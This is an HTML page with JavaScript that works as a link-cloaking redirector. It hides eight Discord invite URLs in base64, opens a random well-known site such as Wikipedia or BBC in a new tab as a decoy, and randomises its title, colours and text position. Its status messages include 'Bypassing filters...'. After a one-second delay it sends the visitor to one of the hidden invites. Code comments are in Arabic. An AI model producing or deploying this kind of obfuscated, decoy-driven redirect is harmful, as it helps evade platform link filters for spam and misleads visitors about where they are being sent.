<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dynamic Gateway</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      overflow: hidden;
      font-family: monospace;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    #console {
      font-size: 20px;
      position: absolute;
    }
  </style>
</head>
<body>
  <div id="console"></div>

  <script>
    const titles = [
      "Secure Route", "Data Gate", "Stealth Mode",
      "Ghost Layer", "Secure Link", "Encrypted Path",
      "Anonymous Hop", "Digital Cloak", "Safe Exit"
    ];

    const messages = [
      "Redirecting...", "Launching encrypted node...",
      "Establishing secure tunnel...", "Initializing gateway...",
      "Routing through CDN...", "Securing payload...",
      "Activating proxy layer...", "Verifying signature...",
      "Transmitting...", "Opening encrypted session...",
      "Passing zero-trace mode...", "Dispatching endpoint...",
      "Linking to safe host...", "Anonymizing route...",
      "Bypassing filters...", "Loading proxy stream...",
      "Redirect sequence engaged...", "Link secured. Executing...",
      "Decrypting and moving...", "Establishing ghost route..."
    ];

    const discordLinks = [
      "aHR0cHM6Ly9kaXNjb3JkLmdnL3lkWHRmQmRhZzY=",
      "aHR0cHM6Ly9kaXNjb3JkLmdnL2JKVWFBWUdld0Q=",
      "aHR0cHM6Ly9kaXNjb3JkLmdnL1VLVzQ5V0t2M3o=",
      "aHR0cHM6Ly9kaXNjb3JkLmdnLzNySHNINzJoYWI=",
      "aHR0cHM6Ly9kaXNjb3JkLmdnL2pmc2dBODN6WGg=",
      "aHR0cHM6Ly9kaXNjb3JkLmdnLzV5ajU4Y25na3g=",
      "aHR0cHM6Ly9kaXNjb3JkLmdnL21KRmJEbWFtdmo=",
      "aHR0cHM6Ly9kaXNjb3JkLmdnL21LbWo5ZVVkM3g="
    ];

    const fakeSites = [
      "https://www.wikipedia.org/", "https://www.bbc.com/", "https://www.stackoverflow.com/",
      "https://www.mozilla.org/", "https://www.reuters.com/", "https://www.cnn.com/",
      "https://www.britannica.com/", "https://www.w3schools.com/", "https://www.gnu.org/",
      "https://developer.mozilla.org/", "https://www.microsoft.com/", "https://www.apple.com/",
      "https://www.linux.org/", "https://www.android.com/", "https://www.nytimes.com/",
      "https://www.bloomberg.com/", "https://github.com/", "https://news.ycombinator.com/"
    ];

    function decodeBase64(str) {
      return atob(str);
    }

    function randomFrom(arr) {
      return arr[Math.floor(Math.random() * arr.length)];
    }

    function randomColor() {
      const letters = "0123456789ABCDEF";
      let color = "#";
      for (let i = 0; i < 6; i++) {
        color += letters[Math.floor(Math.random() * 16)];
      }
      return color;
    }

    function randomPosition() {
      return {
        top: Math.floor(Math.random() * 80) + "%",
        left: Math.floor(Math.random() * 80) + "%"
      };
    }

    // تغيير عنوان الصفحة
    document.title = randomFrom(titles);

    const consoleDiv = document.getElementById("console");
    consoleDiv.textContent = randomFrom(messages);

    // تغيير لون الخلفية والخط
    document.body.style.backgroundColor = randomColor();
    consoleDiv.style.color = randomColor();

    // تغيير مكان النص
    const pos = randomPosition();
    consoleDiv.style.top = pos.top;
    consoleDiv.style.left = pos.left;

    // فتح موقع وهمي في تبويب جديد
    window.open(randomFrom(fakeSites), "_blank");

    // توجيه إلى ديسكورد بعد تأخير عشوائي من 1 إلى 1.5 ثانية
    const delay = Math.random() * (1500 - 1000) + 1000;
    setTimeout(() => {
      window.location.href = decodeBase64(randomFrom(discordLinks));
    }, delay);
  </script>
</body>
</html>
